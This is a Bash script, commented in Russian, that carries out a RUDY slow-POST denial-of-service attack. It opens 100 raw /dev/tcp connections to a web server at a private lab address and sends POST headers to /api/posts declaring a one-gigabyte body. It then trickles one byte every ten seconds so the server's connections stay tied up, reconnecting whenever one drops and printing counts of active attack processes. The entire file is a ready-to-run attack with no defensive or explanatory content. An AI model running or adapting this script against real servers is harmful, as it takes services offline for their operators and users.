#!/bin/bash

TARGET="192.168.56.104"
PORT="80"
CONNECTIONS=100

echo "[*] RUDY (Slow POST) атака на $TARGET:$PORT"
echo "[*] Запуск $CONNECTIONS медленных POST соединений..."
echo "[*] Нажмите Ctrl+C для остановки"
echo ""

for i in $(seq 1 $CONNECTIONS); do
  (
    while true; do
      # Подключение
      exec 3<>/dev/tcp/$TARGET/$PORT 2>/dev/null || { sleep 1; continue; }

      # Отправка POST заголовков с огромным Content-Length
      {
        echo -ne "POST /api/posts HTTP/1.1\r\n"
        echo -ne "Host: $TARGET\r\n"
        echo -ne "User-Agent: Mozilla/5.0\r\n"
        echo -ne "Content-Type: application/x-www-form-urlencoded\r\n"
        echo -ne "Content-Length: 1000000000\r\n"
        echo -ne "\r\n"
      } >&3

      # Медленная отправка тела (1 байт каждые 10 секунд)
      while true; do
        echo -n "X" >&3 2>/dev/null || break
        sleep 10
      done

      exec 3>&-
      sleep 1
    done
  ) &

  # Задержка между запуском соединений
  sleep 0.05

  # Показываем прогресс
  if [ $((i % 10)) -eq 0 ]; then
    echo "[*] Запущено $i/$CONNECTIONS соединений..."
  fi
done

echo ""
echo "[✓] Все $CONNECTIONS соединений активны!"
echo "[*] Соединения медленно отправляют POST данные..."
echo ""

# Статистика каждые 5 секунд
while true; do
  ACTIVE=$(jobs -r | wc -l)
  echo "[$(date '+%H:%M:%S')] Активных процессов: $ACTIVE"
  sleep 5
done